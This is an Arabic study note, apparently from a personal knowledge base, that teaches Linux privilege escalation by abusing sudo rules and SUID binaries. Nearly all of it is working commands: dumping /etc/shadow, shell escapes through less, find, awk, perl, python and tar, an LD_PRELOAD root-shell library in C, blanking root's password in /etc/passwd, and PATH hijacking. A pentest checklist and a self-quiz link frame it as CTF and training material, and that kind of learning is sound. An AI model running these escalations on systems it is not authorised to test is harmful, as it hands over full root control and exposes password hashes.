# 🔥 **1. استغلال أوامر sudo (Abusing Sudo Privileges)**

### 🔥 **مقدمة**

في أنظمة **لينُكس**، يتم التحكم في الصلاحيات باستخدام أوامر مثل `sudo`. في بعض الأحيان، يتم تكوين `sudo` بطريقة غير آمنة، مما يسمح للمستخدمين باستغلاله **لرفع الصلاحيات إلى root**.  
يمكنك التحقق من الصلاحيات التي لديك باستخدام:

```bash
sudo -l
```

يعرض هذا الأمر قائمة بالأوامر التي يمكنك تشغيلها باستخدام `sudo`.

---

# 🔹 **1. استغلال `sudo` لتشغيل أوامر بدون كلمة مرور**

🔸 إذا أظهر `sudo -l` شيئًا مثل:

```bash
(ALL) NOPASSWD: /bin/cat
```

فهذا يعني أنه يمكنك تشغيل `cat` بدون كلمة مرور. يمكنك الآن قراءة أي ملف محمي مثل `/etc/shadow` باستخدام:

```bash
sudo cat /etc/shadow
```

☠️ **الخطورة**: يمكنك استخراج تجزئة كلمات المرور ومحاولة كسرها باستخدام **John the Ripper** أو **Hashcat**.

---

# 🔹 **2. استغلال `sudo` لتشغيل `bash` كـ root**

🔸 إذا كنت تستطيع تشغيل `bash` باستخدام `sudo` مثل:

```bash
(ALL) NOPASSWD: /bin/bash
```

🔹 يمكنك فتح **shell root** مباشرةً باستخدام:

```bash
sudo bash
```

☠️ **الخطورة**: يعطيك وصولًا كاملًا للنظام.

---

# 🔹 **3. استغلال `sudo` عند السماح بأوامر مثل `less` أو `vi`**

🔸 بعض الأوامر مثل `less` و `vi` تسمح بتنفيذ أوامر داخلها. إذا كان لديك الصلاحيات التالية:

```bash
(ALL) NOPASSWD: /usr/bin/less
```

🔹 يمكنك تشغيل `less`، ثم فتح **shell root** كالتالي:

```bash
sudo less /etc/shadow
!bash
```

☠️ **الخطورة**: يمكنك تشغيل أوامر بصلاحيات `root` من داخل `less`.

---

# 🔹 **4. استغلال `sudo` باستخدام `find`**

🔸 إذا كان `sudo -l` يعرض:

```bash
(ALL) NOPASSWD: /usr/bin/find
```

🔹 يمكنك فتح shell كـ root باستخدام:

```bash
sudo find . -exec /bin/bash \;
```

☠️ **الخطورة**: `find` يسمح بتنفيذ أوامر، مما يسهل الحصول على صلاحيات `root`.

---

# 🔹 **5. استغلال `sudo` باستخدام `awk`**

🔸 إذا كان لديك الصلاحية لتشغيل `awk`:

```bash
(ALL) NOPASSWD: /usr/bin/awk
```

🔹 يمكنك تشغيل shell بصلاحيات root:

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

☠️ **الخطورة**: `awk` يمكنه تنفيذ أوامر داخل `BEGIN`.

---

# 🔹 **6. استغلال `sudo` باستخدام `perl`**

🔸 إذا كان لديك إذن تشغيل `perl`:

```bash
(ALL) NOPASSWD: /usr/bin/perl
```

🔹 يمكنك فتح shell كـ root باستخدام:

```bash
sudo perl -e 'exec "/bin/bash";'
```

☠️ **الخطورة**: `perl` يسمح بتنفيذ أكواد برمجية مباشرة.

---

# 🔹 **7. استغلال `sudo` باستخدام `python`**

🔸 إذا كان لديك الصلاحية لتشغيل `python`:

```bash
(ALL) NOPASSWD: /usr/bin/python3
```

🔹 يمكنك تشغيل shell كـ root باستخدام:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```



☠️ **الخطورة**: `python` يمكنه تشغيل أوامر مباشرة بصلاحيات root.

---

# 🔹 **8. استغلال `sudo` باستخدام `tar`**

🔸 إذا كان لديك الصلاحية لتشغيل `tar`:

```bash
(ALL) NOPASSWD: /bin/tar
```

🔹 يمكنك فتح shell بصلاحيات root:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

☠️ **الخطورة**: `tar` يسمح بتنفيذ أوامر عند نقطة معينة.

---

# 🔹 **9. استغلال `sudo` باستخدام `LD_PRELOAD`**

🔸 بعض الأنظمة تسمح بتحميل مكتبات مخصصة عند تشغيل `sudo`. إذا كان `env_keep` مفعلاً، يمكننا استغلال `LD_PRELOAD` كما يلي:

## **📌 الخطوات**

1️⃣ **إنشاء كود C لفتح شل root**

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2️⃣ **ترجمة الكود إلى مكتبة `.so`**

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3️⃣ **تشغيل البرنامج بصلاحيات `sudo` مع `LD_PRELOAD`**

```bash
sudo LD_PRELOAD=/home/user/shell.so find
```

☠️ **الخطورة**: سيتم تحميل مكتبة `.so`، مما يسمح لك بالحصول على **root shell**.

---

# **🔹 10. استغلال `sudo` لتعديل `/etc/passwd`**

🔸 إذا كنت تستطيع تشغيل `vim` أو `nano` باستخدام `sudo`، يمكنك تعديل `/etc/passwd` لإضافة مستخدم root جديد.

## **📌 الخطوات**

1️⃣ **افتح `/etc/passwd` باستخدام `vim` أو `nano`**

```bash
sudo vim /etc/passwd
```

2️⃣ **ابحث عن السطر الخاص بـ `root` وعدله ليصبح:**

```
root::0:0:root:/root:/bin/bash
```

3️⃣ **احفظ الملف، ثم انتقل إلى root**

```bash
su root
```

☠️ **الخطورة**: يمكنك إنشاء مستخدم root جديد بدون الحاجة إلى كلمة مرور.

---
### هام :
أوامر تانية زي `find`، `awk`، `tar`، و `zip` ليهم نفس الاستغلالات. ممكن تستخدم موقع **GTFOBins** للبحث عن أي أمر عندك وتشوف استغلاله:  
[https://gtfobins.github.io/](https://gtfobins.github.io/)

### ✅ **الخلاصة بالعامية:**

لو تقدر تشغل أوامر معينة بـ `sudo`، دور على أمر ممكن يفتح لك Shell بصلاحيات **root**. استخدم `sudo -l` وشوف لو فيه حاجة تقدر تستغلها.

---

# 🔥 **2. استغلال ملفات SUID (Abusing SUID Binaries)**

## 🔹 **2.1 البحث عن ملفات SUID**

نستخدم الأمر ده للبحث عن كل الملفات اللي عليها SUID:

```bash
find / -perm -4000 2>/dev/null
```

ده هيجيب كل الملفات اللي بتشتغل بصلاحيات صاحبها (غالبًا root).

## 🔹 **2.2 استغلال ملف SUID بيشغل أوامر**

لو لقيت ملف زيه زي `find` عنده SUID، تقدر تشغله كالتالي:

```bash
/usr/bin/find . -exec /bin/bash -p \;
```

وده هيفتح لك Shell بصلاحيات root.

## 🔹 **2.3 لو ملف SUID بيستدعي أمر غير آمن**

لو عندك ملف `custom_script` وعرفت إنه بيستدعي `ls` مثلًا جواه، تقدر تعمل التالي:

```bash
echo "/bin/sh" > ls
chmod +x ls
export PATH=.:$PATH
/custom_script
```

وده هيشغل Shell بصلاحيات root لإنه بيستخدم `ls` من الـ PATH اللي انت عدلته.

## ✅ **الخلاصة بالعامية:**

لو فيه ملف عليه SUID، جرب تشوف بيعمل إيه، ولو بيشغل أوامر، ممكن تخليه يشغل Shell بصلاحيات root.

---

# 🚀 **خطوات Pentesting عملية لاستغلال sudo و SUID**

## 🔥 **1. استغلال sudo (Privilege Escalation via Sudo)**

### ✅ **الخطوات:**

1. شوف إيه الأوامر اللي تقدر تشغلها بـ `sudo`:
    
    ```bash
     sudo -l
    ```
لو النتيجه طلعت كده 
![[Pasted image 20250315152254.png]]
اعمل الاتي

2. لو لقيت أمر ممكن يستغل، جرب تشغيل Shell:
    
    ```bash
    sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    
3. لو لقيت أمر بيشغل ملفات، جرب تعمل **Hijacking** للملف اللي بيشغله.

---

## 🔥 **2. استغلال SUID (Privilege Escalation via SUID Binaries)**

### ✅ **الخطوات:**

1. دور على كل ملفات SUID:
    
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    
2. شوف لو فيه أمر معروف عنده SUID، زي `find` أو `vim` أو `bash`:
    
    ```bash
    /usr/bin/find . -exec /bin/bash -p \;
    ```
    
3. لو الملف بيستدعي أمر معين، اعمل **Hijacking** باستخدام PATH Variable:
    
    ```bash
    echo "/bin/sh" > fake_ls
    chmod +x fake_ls
    export PATH=.:$PATH
    /custom_script
    ```
    

---

## 🔥 **الخلاصة العامة بالعامية:**

1. **sudo -l** ده أول حاجة تشوفها، لو تقدر تشغل حاجة بـ sudo بدون باسورد، غالبًا تقدر توصل لـ root.
2. **لو لقيت SUID file**، شوف بيعمل إيه، وجرب تشغله بطرق مختلفة.
3. **لو ملف بيستدعي أوامر خارجية**، حاول تلعب في الـ PATH وتخليه يشغل حاجة انت عاملها بنفسك.

💡 **نصيحة**: لو بتلعب في CTF أو بتعمل **Privilege Escalation**، دايمًا جرب **GTFOBins** و `sudo -l` و `find / -perm -4000` كخطوات أولى. 🚀


# اختبر حفظك : [[Abusing sudo and SUID binaries (Q).]]